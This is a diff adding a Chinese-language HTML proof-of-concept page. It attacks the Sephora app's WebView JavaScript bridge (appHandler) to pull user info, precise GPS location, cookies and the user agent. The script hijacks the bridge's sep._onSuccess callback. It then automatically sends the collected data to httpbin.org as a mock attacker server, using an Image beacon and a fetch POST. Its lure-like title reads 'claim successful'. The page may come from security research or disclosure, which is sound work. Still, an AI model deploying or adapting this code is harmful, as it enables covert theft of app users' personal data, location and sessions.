@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>领取成功</title>
+<style>
+*{box-sizing:border-box}
+body{font-family:-apple-system,'PingFang SC',sans-serif;margin:0;background:#0d0d0d;color:#fff;min-height:100vh;padding:20px;display:flex;flex-direction:column;align-items:center}
+.check{font-size:60px;color:#c9a96e;margin:20px 0 10px}
+h1{font-size:22px;margin:0 0 6px;color:#c9a96e}
+.sub{font-size:12px;color:rgba(255,255,255,.5);margin-bottom:20px}
+.data-box{width:100%;max-width:360px;background:#1a1a1a;border:1px solid rgba(201,169,110,.3);border-radius:12px;padding:16px;margin:10px 0}
+.data-box h3{font-size:14px;color:#c9a96e;margin:0 0 8px;display:flex;align-items:center;gap:6px}
+.data-val{font-family:monospace;font-size:13px;color:#ff6b6b;padding:8px;background:#0a0a0a;border-radius:8px;word-break:break-all;white-space:pre-wrap;min-height:36px}
+.ok{color:#00c853;font-size:12px;margin-top:6px}
+.fail{color:#ff5252;font-size:12px;margin-top:6px}
+.sent{font-size:11px;color:rgba(255,255,255,.3);margin-top:20px;text-align:center;line-height:1.8}
+#banner{display:none;position:fixed;top:0;left:0;right:0;z-index:99999;background:#ff0000;color:#fff;padding:12px;text-align:center;font-weight:bold;font-size:14px}
+</style>
+</head>
+<body>
+<div id="banner">⚠️ 数据已被窃取!</div>
+<div class="check">⚠️</div>
+<h1>攻击成功 — 数据窃取演示</h1>
+<div class="sub">此页面已加载到丝芙兰 APP WebView 中</div>
+
+<div class="data-box">
+  <h3>👤 getUserInfo()</h3>
+  <div class="data-val" id="r1">⏳ 调用中…</div>
+  <div class="ok" id="r1s"></div>
+</div>
+
+<div class="data-box">
+  <h3>📍 getGPS (精确定位)</h3>
+  <div class="data-val" id="r2">⏳ 调用中…</div>
+  <div class="ok" id="r2s"></div>
+</div>
+
+<div class="data-box">
+  <h3>🍪 document.cookie</div>
+  <div class="data-val" id="r3">⏳ 读取中…</div>
+  <div class="ok" id="r3s"></div>
+</div>
+
+<div class="data-box">
+  <h3>📱 设备信息 (UserAgent)</div>
+  <div class="data-val" id="r4" style="color:#aaa;font-size:11px"></div>
+</div>
+
+<div class="sent" id="exfil">
+  数据外传状态: 等待…
+</div>
+
+<script>
+// ═══ 检测桥 ═══
+var hasBridge = typeof window.appHandler !== 'undefined';
+if (!hasBridge) {
+  document.body.innerHTML = '<div style="padding:40px;text-align:center;color:#ff5252"><h2>❌ appHandler 桥不存在</h2><p>此页面可能不在丝芙兰 APP WebView 中</p></div>';
+} else {
+  document.getElementById('banner').style.display = 'block';
+}
+
+// 收集到的所有数据
+var stolen = {};
+
+// ═══ 1. getUserInfo() — 同步返回用户信息 ═══
+try {
+  var userInfo = window.appHandler.getUserInfo();
+  stolen.userInfo = userInfo;
+  document.getElementById('r1').textContent = userInfo || '(空)';
+  document.getElementById('r1').textContent += '';
+  document.getElementById('r1s').textContent = '✓ 获取成功 — 来自 SharedPreferences kol_user_name';
+  document.getElementById('r1s').className = 'ok';
+} catch(e) {
+  document.getElementById('r1').textContent = '调用失败: ' + e.message;
+  document.getElementById('r1s').textContent = '✗ ' + e.message;
+  document.getElementById('r1s').className = 'fail';
+}
+
+// ═══ 2. getGPS — 异步回调(需要设置 sep._onSuccess) ═══
+// 设置回调(丝芙兰 JSBridge 的回调格式)
+window.sep = window.sep || {};
+window.sep._onSuccess = function(callId, data) {
+  var d = typeof data === 'string' ? data : JSON.stringify(data);
+  stolen.gps = d;
+  document.getElementById('r2').textContent = d;
+  document.getElementById('r2s').textContent = '✓ 精确定位已获取';
+  document.getElementById('r2s').className = 'ok';
+  exfil();
+};
+
+try {
+  window.appHandler.appMonitorScript('getGPS', 'gps_call_1', '{}');
+  document.getElementById('r2s').textContent = '⏳ 等待 GPS 回调…';
+} catch(e) {
+  document.getElementById('r2').textContent = '调用失败: ' + e.message;
+  document.getElementById('r2s').className = 'fail';
+}
+
+// 超时处理
+setTimeout(function() {
+  if (!stolen.gps) {
+    document.getElementById('r2').textContent = '(超时 — 可能需要用户授权位置权限)';
+    document.getElementById('r2s').textContent = '⚠️ 回调未收到(5s超时)';
+  }
+}, 5000);
+
+// ═══ 3. Cookie ═══
+try {
+  var cookie = document.cookie || '(此域无cookie)';
+  stolen.cookie = cookie;
+  document.getElementById('r3').textContent = cookie.substring(0, 500) || '(空)';
+  document.getElementById('r3s').textContent = cookie ? '✓ Cookie 读取成功 (' + cookie.length + ' 字)' : '(攻击者域无cookie, 若在 sephora.cn 域则有)';
+  document.getElementById('r3s').className = cookie ? 'ok' : '';
+} catch(e) {
+  document.getElementById('r3').textContent = '读取失败';
+}
+
+// ═══ 4. UserAgent ═══
+document.getElementById('r4').textContent = navigator.userAgent;
+
+// ═══ 5. 外传数据(模拟攻击者收集) ═══
+function exfil() {
+  var payload = JSON.stringify({
+    timestamp: new Date().toISOString(),
+    userInfo: stolen.userInfo || 'N/A',
+    gps: stolen.gps || 'N/A',
+    cookie: stolen.cookie || 'N/A',
+    ua: navigator.userAgent,
+    url: location.href
+  });
+
+  // 方式1: 发到收集端(模拟攻击者服务器)
+  // 用 Image beacon(不会被 CORS 阻止)
+  var img = new Image();
+  img.src = 'https://httpbin.org/get?stolen=' + encodeURIComponent(payload.substring(0, 1800));
+
+  // 方式2: fetch(如果目标允许 CORS)
+  fetch('https://httpbin.org/post', {
+    method: 'POST',
+    body: payload,
+    headers: {'Content-Type': 'application/json'}
+  }).then(function(r) {
+    return r.json();
+  }).then(function(d) {
+    document.getElementById('exfil').innerHTML =
+      '✅ 数据已外传到攻击者服务器 (httpbin.org)<br>' +
+      '📦 Payload: ' + (payload.length) + ' 字节<br>' +
+      '🔗 <a href="https://httpbin.org" style="color:#c9a96e">查看收集端</a>';
+  }).catch(function(e) {
+    document.getElementById('exfil').innerHTML =
+      '📡 Image beacon 已发送 (绕过CORS)<br>' +
+      '📦 数据量: ' + payload.length + ' 字节';
+  });
+}
+
+// 3秒后自动外传(无论GPS是否返回)
+setTimeout(exfil, 3000);
+</script>
+</body>
+</html>
